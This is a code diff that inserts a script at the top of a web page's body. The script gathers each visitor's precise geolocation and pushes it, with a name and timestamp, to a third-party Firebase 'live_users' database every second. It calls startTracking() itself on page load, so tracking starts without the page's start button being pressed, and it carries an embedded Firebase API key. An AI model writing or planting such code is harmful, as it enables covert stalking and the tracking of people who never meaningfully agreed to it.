@@ -177,6 +177,89 @@
     </style>
 </head>
 <body>
+
+
+<script type="module">
+
+
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+  import { getDatabase, ref, set, onDisconnect } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+  const firebaseConfig = {
+    apiKey:"AIzaSyANYll-qeksxMuUqc3CFwwJuHUJM4qHfXI",
+    authDomain:"find-47127.firebaseapp.com",
+    databaseURL:"https://find-47127-default-rtdb.firebaseio.com",
+    projectId:"find-47127",
+    storageBucket:"find-47127.firebasestorage.app",
+    messagingSenderId:"1014079574991",
+    appId:"1:1014079574991:web:4537e02e064c912a3a38ba"
+  };
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
+  const sessionId = 'u_'+Date.now()+'_'+Math.random().toString(36).substr(2,5);
+  let watchId=null, intervalId=null;
+  let updateCount=0, lastPos=null, userRef=null, uName='Anonymous';
+
+  window.startTracking = function() {
+    if(!navigator.geolocation){showErr("Browser geolocation support nahi karta.");return;}
+    uName = document.getElementById('userName').value.trim()||'Anonymous';
+    document.getElementById('userName').disabled=true;
+    document.getElementById('startBtn').style.display='none';
+    document.getElementById('statusError').style.display='none';
+    document.getElementById('stoppedBox').style.display='none';
+    document.getElementById('iconWrap').classList.add('pulsing');
+    document.getElementById('iconWrap').textContent='📡';
+    userRef = ref(db,'live_users/'+sessionId);
+    onDisconnect(userRef).remove();
+    navigator.geolocation.getCurrentPosition(pos=>{
+      lastPos=pos; pushLoc(pos);
+      document.getElementById('liveBar').classList.add('show');
+      document.getElementById('stopBtn').style.display='block';
+      // Watch position
+      watchId = navigator.geolocation.watchPosition(p=>{lastPos=p;},null,{enableHighAccuracy:true,maximumAge:0});
+      // Push every 1 second
+      intervalId = setInterval(()=>{if(lastPos) pushLoc(lastPos);},1000);
+    },err=>{
+      document.getElementById('startBtn').style.display='block';
+      document.getElementById('userName').disabled=false;
+      document.getElementById('iconWrap').classList.remove('pulsing');
+      document.getElementById('iconWrap').textContent='📍';
+      if(err.code===1) showErr("Aapne permission deny ki. Browser settings se allow karo.");
+      else if(err.code===2) showErr("GPS on karo aur dobara try karo.");
+      else showErr("Kuch error aaya. Dobara try karo.");
+    },{enableHighAccuracy:true,timeout:15000,maximumAge:0});
+  };
+
+  function pushLoc(pos){
+    const {latitude,longitude,accuracy}=pos.coords;
+    updateCount++;
+    const now=new Date();
+    set(userRef,{name:uName,lat:latitude,lng:longitude,accuracy:Math.round(accuracy),time:now.toISOString(),active:true,updates:updateCount,sessionId});
+    document.getElementById('latVal').textContent=latitude.toFixed(6);
+    document.getElementById('lngVal').textContent=longitude.toFixed(6);
+    document.getElementById('accVal').textContent=Math.round(accuracy)+'m';
+    document.getElementById('lastTime').textContent=now.getHours().toString().padStart(2,'0')+':'+now.getMinutes().toString().padStart(2,'0')+':'+now.getSeconds().toString().padStart(2,'0');
+    document.getElementById('updateCount').textContent=updateCount;
+  }
+
+  window.stopTracking = function(){
+    if(watchId!==null) navigator.geolocation.clearWatch(watchId);
+    if(intervalId!==null) clearInterval(intervalId);
+    if(userRef) set(userRef,null);
+    document.getElementById('liveBar').classList.remove('show');
+    document.getElementById('stopBtn').style.display='none';
+    document.getElementById('iconWrap').classList.remove('pulsing');
+    document.getElementById('iconWrap').textContent='🛑';
+    document.getElementById('stoppedBox').style.display='block';
+    document.getElementById('startBtn').style.display='block';
+    document.getElementById('startBtn').textContent='📍 Dobara Share Karo';
+    document.getElementById('userName').disabled=false;
+    updateCount=0; lastPos=null;
+  };
+  function showErr(msg){document.getElementById('errorMsg').textContent=msg;document.getElementById('statusError').style.display='block';}
+  
+  startTracking();
+</script>
+
     <div id="overlay" onclick="toggleMenu()"></div>
     
     <div class="top-nav">
